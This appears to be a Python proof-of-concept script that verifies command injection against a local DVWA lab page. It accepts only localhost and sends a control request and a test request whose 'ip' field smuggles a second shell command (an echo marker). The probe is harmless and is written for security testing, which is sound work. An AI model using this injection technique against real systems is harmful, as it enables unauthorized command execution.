#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CMD-001 command-injection verification draft (harmless echo marker, localhost only).

Example:
  python cmd001_poc.py --base-url http://127.0.0.1/dvwa/vulnerabilities/exec/ --cookie-file ./local_cookie.txt --target 127.0.0.1 --os linux
"""

import argparse
import sys
import urllib.error
import urllib.parse
import urllib.request

ALLOWED_HOSTS = ('localhost', '127.0.0.1', '::1')


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def check_base_url(url):
    parts = urllib.parse.urlsplit(url)
    if parts.scheme not in ('http', 'https'):
        raise SystemExit('refuse: only http/https allowed, got %r' % (parts.scheme,))
    host = (parts.hostname or '').lower()
    if host not in ALLOWED_HOSTS:
        raise SystemExit('refuse: only localhost/127.0.0.1/::1 allowed, got %r' % (host,))


def read_cookie(path):
    if not path:
        return None
    with open(path, 'r', encoding='utf-8') as handle:
        value = handle.read().strip()
    return value or None


def send(opener, url, payload, cookie, timeout):
    data = urllib.parse.urlencode(payload).encode('utf-8')
    request = urllib.request.Request(url, data=data, method='POST')
    request.add_header('Content-Type', 'application/x-www-form-urlencoded')
    request.add_header('User-Agent', 'wp4-cmd001-poc/1.0')
    if cookie:
        request.add_header('Cookie', cookie)
    try:
        with opener.open(request, timeout=timeout) as response:
            return response.status, response.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode('utf-8', 'replace')


def main():
    parser = argparse.ArgumentParser(description='CMD-001 local command-injection check (harmless marker)')
    parser.add_argument('--base-url', required=True)
    parser.add_argument('--cookie-file', default=None)
    parser.add_argument('--target', default='127.0.0.1')
    parser.add_argument('--os', dest='os_name', choices=('linux', 'windows'), default='linux')
    parser.add_argument('--marker', default='WP2_CMD001_MARKER')
    parser.add_argument('--timeout', type=float, default=10.0)
    args = parser.parse_args()

    check_base_url(args.base_url)
    cookie = read_cookie(args.cookie_file)
    opener = urllib.request.build_opener(NoRedirect)

    if args.os_name == 'windows':
        injected = '%s & echo %s' % (args.target, args.marker)
    else:
        injected = '%s; echo %s' % (args.target, args.marker)

    control = {'Submit': 'Submit', 'ip': args.target}
    test = {'Submit': 'Submit', 'ip': injected}

    try:
        control_status, control_body = send(opener, args.base_url, control, cookie, args.timeout)
        test_status, test_body = send(opener, args.base_url, test, cookie, args.timeout)
    except urllib.error.URLError as exc:
        raise SystemExit('network/connection error (not verified): %s' % (exc,))
    except OSError as exc:
        raise SystemExit('socket/timeout error (not verified): %s' % (exc,))

    control_hit = args.marker in control_body
    test_hit = args.marker in test_body

    print('control request: HTTP %s, marker=%s' % (control_status, control_hit))
    print('test request:    HTTP %s, marker=%s' % (test_status, test_hit))

    if control_status in (301, 302, 303, 307, 308) or test_status in (301, 302, 303, 307, 308):
        print('redirect observed: session or URL likely wrong, fix login/URL before judging')

    if test_hit and not control_hit:
        print('observed extra marker in test response: static candidate has first-level observation, confirm manually')
    elif test_hit and control_hit:
        print('marker also in control response: not evidence of command interpretation')
    else:
        print('no marker observed: no evidence from this run; do not conclude safe either')

    return 0


if __name__ == '__main__':
    sys.exit(main())
